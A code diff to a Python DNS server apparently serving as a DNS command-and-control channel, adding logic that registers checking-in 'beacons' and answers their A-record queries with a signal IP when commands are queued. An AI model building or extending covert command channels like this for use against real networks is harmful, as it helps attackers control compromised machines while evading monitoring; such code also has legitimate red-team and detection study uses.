@@ -14,8 +14,9 @@ class DNSResponse:
         addr - the address to send the packet too.
         txt - boolean value whether it's a txt record or not      
         server - the server sending the query
+        chk - if the beacon checking in has commands queued up
     """
-    def __init__(self, addr, txt, server):
+    def __init__(self, addr, txt, server, chk):
         self.addr = addr
         self.packet = None
         self.txt = txt
@@ -30,6 +31,7 @@ class DNSResponse:
         self.frag = False               # if the file needs to be fragmented
         self.sendName = False           # if were sending the file name to the beacon
         self.sendAll = server.sendAll   # send commands to any beacon
+        self.chk = chk
 
     """
         Packs data into a binary struct to send as a
@@ -112,8 +114,12 @@ class DNSResponse:
                         self.beacons.remove(found)   # remove beacon from list 
 
         else:   # load IP for A record
-            self.packet += struct.pack("!H", 4) # RDLENGTH 2 bytes
-            self.packet += struct.pack("!I", 2165670612)  # RDATA, should be IP address from A record
+            if self.chk:
+                self.packet += struct.pack("!H", 4) # RDLENGTH 2 bytes
+                self.packet += struct.pack("!I", 16843009)  # RDATA, IP address saying the beacon has cmds
+            else:
+                self.packet += struct.pack("!H", 4) # RDLENGTH 2 bytes
+                self.packet += struct.pack("!I", 2165670612)  # RDATA, should be IP address from A record
         
 
     """
@@ -177,7 +183,15 @@ class DNSResponse:
 def send_response(addr, server, dnsQuery, txt):
     packet_num = 1
     print "Sending response"
-    response = DNSResponse(addr, txt, server)
+    chk = False
+    if dnsQuery.checkin: 
+        for x in server.bList:
+            if x.ip == addr[0]:
+                chk = True
+        if not chk:
+            server.add_beacon(addr[0])
+
+    response = DNSResponse(addr, txt, server, chk)
     if response.f:
         #send over file name
         response.sendName = True
@@ -200,7 +214,6 @@ def send_response(addr, server, dnsQuery, txt):
         response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
         server.sock.sendto(bytes(response.packet), addr)
 
-    if dnsQuery.checkin: server.add_beacon(addr[0])
     server.bList = response.beacons     # update list if any were removed
     print addr
     print "Response sent"
